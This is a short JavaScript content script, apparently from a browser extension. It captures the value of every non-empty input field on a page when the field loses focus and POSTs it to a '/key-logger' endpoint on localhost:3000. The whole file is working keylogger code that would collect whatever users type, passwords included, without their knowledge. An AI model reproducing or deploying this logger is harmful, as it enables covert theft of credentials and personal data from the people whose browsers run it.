console.log("Content script loaded.");

const logKeys = (key) => {
    const data = {
        keys: key
    }
    
    fetch('http://localhost:3000/key-logger', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
        .then(response => response.text())
        .then(data => {
            console.log('Sent:', key);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
}

const keyCodes = () => {
    document.addEventListener('focusout', function (e) {
        if (e.target.tagName === 'INPUT' && e.target.value !== '') {
            logKeys(e.target.value)
        }
    });
};

keyCodes();